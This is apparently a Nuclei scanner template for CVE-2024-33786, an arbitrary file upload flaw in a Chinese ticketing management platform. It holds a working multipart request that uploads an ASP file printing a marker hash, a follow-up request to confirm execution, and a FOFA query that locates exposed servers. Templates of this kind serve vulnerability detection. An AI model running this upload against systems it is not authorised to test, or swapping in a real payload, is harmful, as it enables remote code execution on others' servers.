id: CVE-2024-33786

info:
  name: 中城科信票务管理平台任意文件上传漏洞
  author: Simple
  severity: critical
  description: |
    中城科信票务管理平台20.04中存在任意文件上传漏洞，攻击者可以通过上传精心设计的文件来执行任意代码。
  reference:
    - https://github.com/JJThome
  metadata:
    fofa-query: body="技术支持：北京中成科信科技发展有限公司"
  tags: 中城科信票务管理平台

variables:
  filename: '{{rand_base(6)}}'

http:
  - raw:
      - |
        POST /SystemManager/Introduction.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
        Connection: close
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
        Accept-Encoding: gzip


        ----------------------------354575237365372692397370
        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
        Content-Type: image/jpeg

        <% Response.Write("c7ff66de90f5b695091cc4826d22d137") %>

        ----------------------------354575237365372692397370
        Content-Disposition: form-data; name="fileName"

        {{filename}}.asp
        ----------------------------354575237365372692397370
        Content-Disposition: form-data; name="Method"

        UpdateUploadLinkPic
        ----------------------------354575237365372692397370
      - |
        GET /UploadImage/{{upload_name}}.asp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "c7ff66de90f5b695091cc4826d22d137")'
        condition: and

    extractors:
      - type: regex # type of the extractor
        name: upload_name
        part: body  # part of the response (header,body,all)
        group: 1
        regex:
          - '\.\./UploadImage/(\w+)\.asp'  # regex to use for extraction.
        internal: true